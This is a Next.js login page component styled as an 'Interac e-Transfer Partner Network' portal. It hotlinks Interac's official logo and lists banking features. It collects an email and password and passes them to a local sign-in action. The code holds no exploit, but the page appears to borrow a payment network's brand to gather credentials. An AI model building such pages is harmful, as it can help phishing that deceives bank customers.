"use client"

import type React from "react"
import { useState, useTransition, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import { signIn } from "@/lib/actions/auth"
import {
  AlertCircle,
  Eye,
  EyeOff,
  SendIcon,
  DollarSign,
  CreditCard,
  History,
  Users,
  FileText,
  Bell,
  BarChart3,
  ArrowRight,
  Shield,
  Zap,
  Lock,
  Loader2,
} from "lucide-react"
import Link from "next/link"

const featureItems = [
  { icon: SendIcon,   label: "Send e-Transfer",       color: "text-blue-400",   bg: "bg-blue-500/10"   },
  { icon: DollarSign, label: "Receive Funds",          color: "text-emerald-400", bg: "bg-emerald-500/10" },
  { icon: CreditCard, label: "Link Bank Account",      color: "text-violet-400",  bg: "bg-violet-500/10"  },
  { icon: History,    label: "Transaction History",    color: "text-amber-400",   bg: "bg-amber-500/10"   },
  { icon: Users,      label: "Contacts & Recipients",  color: "text-cyan-400",    bg: "bg-cyan-500/10"    },
  { icon: FileText,   label: "Statements & Reports",   color: "text-indigo-400",  bg: "bg-indigo-500/10"  },
  { icon: Bell,       label: "Alerts & Notifications", color: "text-yellow-400",  bg: "bg-yellow-500/10"  },
  { icon: BarChart3,  label: "Payment Insights",       color: "text-teal-400",    bg: "bg-teal-500/10"    },
]

const trustItems = [
  { icon: Shield, label: "Bank-grade encryption" },
  { icon: Zap,    label: "Instant transfers"      },
  { icon: Lock,   label: "2-step verification"    },
]

function LoginForm() {
  const [showPassword, setShowPw] = useState(false)
  const [error, setError] = useState("")
  const [isPending, startTransition] = useTransition()
  const searchParams = useSearchParams()
  const authError = searchParams.get("error")

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setError("")

    const formData = new FormData(e.currentTarget)

    startTransition(async () => {
      const result = await signIn(formData)
      if (result?.error) {
        setError(result.error)
      } else if (result?.success && result?.redirectTo) {
        // Hard navigation — browser re-requests the page with the new
        // Supabase session cookies, so the proxy sees an authenticated user.
        window.location.href = result.redirectTo
      }
    })
  }

  return (
    <div className="min-h-screen bg-[#080808] flex items-stretch">

      {/* Left panel - branding & features (desktop only) */}
      <aside className="hidden lg:flex flex-col w-[480px] xl:w-[520px] shrink-0 border-r border-white/[0.06] bg-[#0d0d0d] relative overflow-hidden">
        {/* Subtle grid pattern */}
        <div
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage: `linear-gradient(rgba(255,255,255,.5) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(255,255,255,.5) 1px, transparent 1px)`,
            backgroundSize: "40px 40px",
          }}
        />
        {/* Yellow glow top-left */}
        <div className="absolute -top-32 -left-32 w-64 h-64 bg-[#FDB913]/8 rounded-full blur-3xl pointer-events-none" />

        <div className="relative z-10 flex flex-col h-full px-10 xl:px-12 py-10">
          {/* Logo */}
          <div className="flex items-center gap-3.5 mb-12">
            <div className="w-11 h-11 bg-[#FDB913] rounded-xl flex items-center justify-center p-2.5 shadow-lg shadow-[#FDB913]/20">
              <img
                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
                alt="Interac"
                className="w-full h-full object-contain"
                crossOrigin="anonymous"
              />
            </div>
            <div>
              <p className="text-[15px] font-bold text-white tracking-tight leading-none mb-0.5">Partner Network</p>
              <p className="text-[11px] text-zinc-500 leading-none">Interac e-Transfer</p>
            </div>
          </div>

          {/* Headline */}
          <div className="mb-10">
            <h1 className="text-3xl xl:text-4xl font-bold text-white leading-[1.15] text-balance mb-4">
              Your financial<br />gateway, secured.
            </h1>
            <p className="text-zinc-400 text-[15px] leading-relaxed max-w-xs">
              Access all your e-Transfer services, account management, and payment tools in one place.
            </p>
          </div>

          {/* Feature grid */}
          <div className="grid grid-cols-2 gap-2 mb-10">
            {featureItems.map((item, i) => {
              const Icon = item.icon
              return (
                <div
                  key={i}
                  className="flex items-center gap-2.5 px-3 py-2.5 rounded-xl bg-white/[0.03] border border-white/[0.05] hover:border-white/[0.09] transition-colors"
                >
                  <div className={`w-7 h-7 rounded-lg ${item.bg} flex items-center justify-center shrink-0`}>
                    <Icon className={`w-3.5 h-3.5 ${item.color}`} />
                  </div>
                  <span className="text-[12px] font-medium text-zinc-400 leading-tight">{item.label}</span>
                </div>
              )
            })}
          </div>

          {/* Trust badges */}
          <div className="flex items-center gap-4 mt-auto pt-8 border-t border-white/[0.05]">
            {trustItems.map((t, i) => {
              const Icon = t.icon
              return (
                <div key={i} className="flex items-center gap-1.5">
                  <Icon className="w-3.5 h-3.5 text-[#FDB913]/70" />
                  <span className="text-[11px] text-zinc-600">{t.label}</span>
                </div>
              )
            })}
          </div>
        </div>
      </aside>

      {/* Right panel - login form */}
      <main className="flex-1 flex flex-col items-center justify-center px-5 sm:px-8 py-10 relative">
        {/* Subtle radial glow behind the form */}
        <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
          <div className="w-[500px] h-[500px] bg-[#FDB913]/3 rounded-full blur-3xl" />
        </div>

        <div className="relative z-10 w-full max-w-[400px]">
          {/* Mobile logo */}
          <div className="flex lg:hidden items-center gap-3 mb-10">
            <div className="w-10 h-10 bg-[#FDB913] rounded-xl flex items-center justify-center p-2 shadow-lg shadow-[#FDB913]/20">
              <img
                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
                alt="Interac"
                className="w-full h-full object-contain"
                crossOrigin="anonymous"
              />
            </div>
            <div>
              <p className="text-[14px] font-bold text-white leading-none mb-0.5">Partner Network</p>
              <p className="text-[11px] text-zinc-500 leading-none">Interac e-Transfer</p>
            </div>
          </div>

          {/* Heading */}
          <div className="mb-8">
            <h2 className="text-2xl sm:text-[28px] font-bold text-white tracking-tight mb-1.5">Welcome back</h2>
            <p className="text-[14px] text-zinc-500">Sign in to access your portal</p>
          </div>

          {/* Form card */}
          <div className="bg-white/[0.03] border border-white/[0.08] rounded-2xl p-6 shadow-2xl shadow-black/60">
            <form onSubmit={handleSubmit} className="space-y-5" noValidate>

              {/* Email */}
              <div className="space-y-1.5">
                <label htmlFor="email" className="block text-[13px] font-medium text-zinc-300">
                  Email address
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  autoComplete="email"
                  placeholder="you@example.com"
                  required
                  disabled={isPending}
                  className="w-full h-11 px-3.5 rounded-xl bg-white/[0.05] border border-white/[0.09] text-[14px] text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-[#FDB913]/40 focus:border-[#FDB913]/40 transition-all disabled:opacity-50"
                  style={{ fontSize: "16px" }}
                />
              </div>

              {/* Password */}
              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <label htmlFor="password" className="block text-[13px] font-medium text-zinc-300">
                    Password
                  </label>
                  <Link 
                    href="/forgot-password" 
                    className="text-[12px] text-[#FDB913] hover:text-[#e5a811] transition-colors"
                  >
                    Forgot password?
                  </Link>
                </div>
                <div className="relative">
                  <input
                    id="password"
                    name="password"
                    type={showPassword ? "text" : "password"}
                    autoComplete="current-password"
                    placeholder="Enter your password"
                    required
                    disabled={isPending}
                    className="w-full h-11 pl-3.5 pr-11 rounded-xl bg-white/[0.05] border border-white/[0.09] text-[14px] text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-[#FDB913]/40 focus:border-[#FDB913]/40 transition-all disabled:opacity-50"
                    style={{ fontSize: "16px" }}
                  />
                  <button
                    type="button"
                    tabIndex={-1}
                    onClick={() => setShowPw(v => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-600 hover:text-zinc-400 transition-colors"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword
                      ? <EyeOff className="w-4 h-4" />
                      : <Eye className="w-4 h-4" />
                    }
                  </button>
                </div>
              </div>

              {/* Error */}
              {(error || authError) && (
                <div
                  role="alert"
                  className="flex items-start gap-2.5 p-3 bg-red-500/10 border border-red-500/20 rounded-xl"
                >
                  <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                  <p className="text-[13px] text-red-400 leading-snug">
                    {error || "Authentication failed. Please try again."}
                  </p>
                </div>
              )}

              {/* Submit */}
              <button
                type="submit"
                disabled={isPending}
                className="w-full h-11 flex items-center justify-center gap-2 rounded-xl bg-[#FDB913] text-[#111] text-[14px] font-bold tracking-wide hover:bg-[#e5a811] active:scale-[0.98] transition-all duration-150 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-[#FDB913]/10 focus:outline-none focus:ring-2 focus:ring-[#FDB913]/50 focus:ring-offset-2 focus:ring-offset-[#080808]"
              >
                {isPending ? (
                  <svg className="w-4 h-4 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                  </svg>
                ) : (
                  <>
                    Sign in
                    <ArrowRight className="w-4 h-4" />
                  </>
                )}
              </button>
            </form>

            {/* Sign up link */}
            <div className="mt-6 pt-5 border-t border-white/[0.06] text-center">
              <p className="text-[13px] text-zinc-500">
                {"Don't have an account? "}
                <Link 
                  href="/signup" 
                  className="text-[#FDB913] hover:text-[#e5a811] font-medium transition-colors"
                >
                  Sign up
                </Link>
              </p>
            </div>
          </div>

          {/* Mobile features strip */}
          <div className="lg:hidden mt-8 pt-6 border-t border-white/[0.06]">
            <p className="text-[11px] text-zinc-600 uppercase tracking-widest font-semibold mb-3 text-center">Available services</p>
            <div className="flex flex-wrap justify-center gap-2">
              {featureItems.map((item, i) => {
                const Icon = item.icon
                return (
                  <div
                    key={i}
                    title={item.label}
                    className={`w-9 h-9 rounded-xl ${item.bg} flex items-center justify-center`}
                  >
                    <Icon className={`w-4 h-4 ${item.color}`} />
                  </div>
                )
              })}
            </div>
          </div>

          {/* Footer */}
          <p className="text-center text-[11px] text-zinc-500 mt-8">
            Interac e-Transfer &middot; Secure Payment Services
          </p>
        </div>
      </main>
    </div>
  )
}

function LoginLoading() {
  return (
    <div className="min-h-screen bg-[#080808] flex items-center justify-center">
      <Loader2 className="w-8 h-8 text-[#FDB913] animate-spin" />
    </div>
  )
}

export default function LoginPage() {
  return (
    <Suspense fallback={<LoginLoading />}>
      <LoginForm />
    </Suspense>
  )
}
